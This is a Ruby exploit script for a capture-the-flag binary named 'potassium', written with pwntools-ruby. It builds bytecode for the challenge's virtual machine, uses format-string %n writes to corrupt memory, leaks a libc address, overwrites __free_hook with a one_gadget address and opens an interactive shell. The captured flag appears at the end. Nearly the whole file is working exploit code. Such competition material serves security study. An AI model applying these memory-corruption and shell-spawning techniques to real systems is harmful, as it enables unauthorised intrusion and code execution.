#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'k.chal.pwning.xxx', 2994
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'potassium'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================

def to_int_(v)
  raise if v > 0x7fffffff || v < 0
  s = []
  return [0] if v == 0
  while v != 0
    s << ((v & 0x7f) | 0x80)
    v >>= 7
  end
  s[-1] &= 0x7f
  s
end

def set_retval(v) # TO 2
  to_int_(v).unshift(0xe)
end

def readfile
  [0x14]
end

def getc
  [0x13]
end

def putc
  [0x12]
end

def load_b
  [0xb]
end

def store_w
  [0x9]
end

def store_b
  [0xc]
end

def push2var
  [2]
end

TO1 = [1]
def mov_off_val(off, val) # codeseg[off] = val
  TO1 +
    store_w +
    set_retval(off) +
    set_retval(val)
end

def quote(msg)
  z.gets('>')
  z.puts('3')
  z.gets(':')
  z.puts(msg)
end

def setname(name, q = '>')
  z.gets(q)
  z.puts('4721')
  z.gets(':')
  z.puts(name)
end

def setpromt(promt, q = '>')
  z.gets(q)
  z.puts('3291')
  z.gets(':')
  z.puts(promt)
end

def gambling
  z.gets('>')
  z.puts('3725')
end

name = 'awfvhw'
z.gets ':'
z.puts name

@q_off = q_off = 0x1800

def flag2_payload
  sc_off = @q_off
  filename_off = sc_off + 12 + 1
  flag_off = 0x6e2c + ARGV[0].to_i

  payload = []
  payload.concat TO1 # push to phase 1
  payload.concat readfile # push readfile
  payload.concat set_retval(filename_off) # to phase 2, readfile, then TO 1

  payload.concat TO1 # push to phase 1
  payload.concat putc
  payload.concat load_b
  payload.concat set_retval(flag_off) # to phase 2, load_b, then putc

  payload.concat "flag2.txt\x00".unpack('C*')
  payload.pack('C*')
end

def get_var(v)
  to_int_(v).unshift(0)
end

def write_at(o)
  TO1 +
    putc +
    load_b +
    set_retval(o) # to phase 2, load_b, then putc
end

def read_at(o)
  TO1 +
    store_b +
    set_retval(o) +
    getc
end

@select = []
def shellcode
  sc_off = @q_off
  # Stack to:
  #   p(0x26, 2, 0, 0)
  #   0x1825 # return address
  #   0x100 # variable_top -= 0x100
  payload = []
  rop = 0xc000 + 0x22 * 4
  payload.concat mov_off_val(rop, 0x226)
  payload.concat mov_off_val(rop - 4, sc_off + 0x25) # return address
  payload.concat mov_off_val(rop - 8, (0x2354 / 4) + 5) # let variables_top point to &CPU->codeseg
  payload.concat mov_off_val(rop - 12, 1) # phase2 -> phase1
  payload.concat getc # one-byte, change to status 2 without pushing something
  payload.concat [0x11] * (0x25 - payload.size) # nop
  raise if payload.size > 0x25
  #------- put libc addr to 0x0
  off = 0
  payload.concat(TO1 +
                 store_w +
                 set_retval(off) +
                 get_var(0x1130 / 4 - 5))
  payload.concat(TO1 +
                 store_w +
                 set_retval(off + 4) +
                 get_var(0x1130 / 4 - 6))
  (1..5).each { |i| payload.concat(write_at(i)) }
  # stage 2, modify codeseg
  # use read_at to read 0xe [retval]
  there = payload.size + read_at(@q_off).size * 10 + @q_off
  off = there + 4 # push2var, 0xe, 0xa8, 7 # guess 2 bits, probability 25%
  3.times { |_i| payload.concat(read_at(off)); @select << off - there; off += 1 }
  off += 2 # push2var, 0xe
  2.times { |_i| payload.concat(read_at(off)); @select << off - there; off += 1 }
  off += 8 # 1, [1, 9, 14, 0, 14, 0x16, 0x2] # guess 2 bits.
  3.times { |_i| payload.concat(read_at(off)); @select << off - there; off += 1 }
  off += 5 # [1, 9, 14, 0, 14]
  2.times { |_i| payload.concat(read_at(off)); @select << off - there; off += 1 }
  # there:
  payload.concat (
    push2var + set_retval(0x7ffff7a8) + # a0 points to free_hook
    push2var + set_retval(0x7fff) +
    mov_off_val(0, 0x7fffe26a) +
    mov_off_val(4, 0x7fff)
  )
  # 1.times { payload.concat getc } # pause
  payload.pack('C*')
end

# payload = flag2_payload
payload = shellcode
log.dump payload
log.dump payload.size
raise if payload.bytes.include?(10)

setname('a' * 4 + "\xf8\x33\x00\x00\xf9\x33\x00\x00\xfc\x33\x00\x00")
z.gets('>')
z.puts('0')
setpromt('%112d' + '%3288$n')
setpromt("%#{0x33e4}d%3286$n", '6')
setpromt('>', '6')

quote(p32(0x97f) + p64(0x0000337800003180) + p64(0x000032740000338c) + p64((0x399f << 32) + q_off)[0..-2])
quote(payload)

x = q_off - 0x985

setname(([1, 5, 0, 0] + to_int_(x)).pack('C*'))
z.puts('4294967294') # trigger shellcode!

z.puts '' # consume getc
z.gets '>'
context.log_level = :debug
libc = ("\x78" + z.recvn(5) + "\x00\x00").u64 - 0x3c4c78
log.dump libc.hex
# h.offset(libc)
free_hook = libc + 0x3c67a8
# probability: 1/8
(log.fatal 'no luck QQ'; exit) if libc & 0x80000000 != 0 || to_int_(0x7ffff7a8)[0, 2] != to_int_(free_hook & 0xffffffff)[0, 2]
# STDIN.gets
magic = libc + one_gadget('./libc.so.6')[1]

all =
  push2var + set_retval(free_hook & 0xffffffff) +
  push2var + set_retval(free_hook >> 32) +
  mov_off_val(0, magic & 0xffffffff) +
  mov_off_val(4, magic >> 32)
z.write(@select.map { |i| all[i] }.pack('C*'))
z.interact

# flag3-3a0613c2430af52da8def9b2f6068361ef0ab9c4.txt
# pctf{1_think_th4t_w4s_a_S1GN_t0_b3_c4r3fu1}
